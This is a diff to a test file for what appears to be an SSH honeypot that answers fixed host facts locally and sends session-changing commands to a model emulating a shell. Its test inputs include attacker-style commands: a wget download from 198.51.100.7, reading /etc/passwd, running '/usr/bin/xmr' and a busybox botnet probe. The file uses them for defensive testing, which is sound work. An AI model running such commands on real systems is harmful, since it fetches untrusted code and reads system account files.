@@ -443,7 +443,8 @@ async def _ask(history, text, interactive=True, sid="s1"):
 def test_fallback_reply_uses_the_shared_shell():
     assert hooks.fallback_reply("lspci | grep VGA -c", True, "root") == "1\r\nroot@srv01:~# "
     assert hooks.fallback_reply("system", True, "root") == "root@srv01:~# "
-    assert hooks.fallback_reply("nproc", False, "root") == "2\n"
+    assert hooks.fallback_reply("nproc", False, "root") == \
+        f"{hooks.shell_host().hardware.cpus}\n"
     assert hooks.fallback_reply("frobnicate", True, "root") == \
         "-bash: frobnicate: command not found\r\nroot@srv01:~# "
     # an SSH exec command runs under bash -c; the default host's bash 5.1 adds "line 1"
@@ -466,14 +467,36 @@ async def test_host_facts_are_answered_ahead_of_the_model():
     assert [m.content for m in messages[:2]] == ["lspci | grep VGA -c", "1\r\nroot@srv01:~# "]
 
 
-async def test_session_state_still_goes_to_the_model():
+async def test_session_state_is_local_only_until_a_model_reply():
     hooks.set_budget(Budget(BudgetConfig()))
     history = RecordingHistory()
-    for text in ("ls", "cd /tmp", "wget http://198.51.100.7/x", "ps aux", "echo hi",
-                 "cat /etc/passwd", "cat notes.txt"):
+    # before any model reply the host is as profiled: ls, ps, pwd, passwd are local
+    for text in ("ls", "ps aux", "pwd", "cat /etc/passwd", "echo hi", "id"):
+        assert getattr(await _ask(history, text), "local_reply", False), text
+    # commands that change the session always go to the model
+    for text in ("cd /tmp", "wget http://198.51.100.7/x", "export A=1", "cat notes.txt"):
         await _ask(history, text)
-    assert history.calls == ["ls", "cd /tmp", "wget http://198.51.100.7/x", "ps aux", "echo hi",
-                             "cat /etc/passwd", "cat notes.txt"]
+    assert history.calls == ["cd /tmp", "wget http://198.51.100.7/x", "export A=1",
+                             "cat notes.txt"]
+    # after that, facts a session can change go to the model (root can rewrite release
+    # files, and a download can create any path) ...
+    for text in ("ls", "ps aux", "id", "uname -a", "cat /etc/os-release", "/usr/bin/xmr"):
+        assert not getattr(await _ask(history, text), "local_reply", False), text
+    # ... and facts no session can change stay local, under the model's last prompt
+    for text in ("uname -r", "nproc", "free -m", "cat /proc/cpuinfo | grep -c processor",
+                 "lspci", "busybox ECCHI", "enable", "w"):
+        r = await _ask(history, text)
+        assert getattr(r, "local_reply", False), text
+    assert history.calls[-6:] == ["ls", "ps aux", "id", "uname -a", "cat /etc/os-release",
+                                  "/usr/bin/xmr"]
+
+
+async def test_a_fixed_fact_after_a_model_cd_shows_the_models_prompt():
+    hooks.set_budget(Budget(BudgetConfig()))
+    history = RecordingHistory("root@srv01:/var/tmp# ")
+    await _ask(history, "cd /var/tmp")
+    r = await _ask(history, "nproc")
+    assert r.local_reply and r.content.endswith("\r\nroot@srv01:/var/tmp# ")
 
 
 async def test_switch_off_sends_everything_to_the_model():
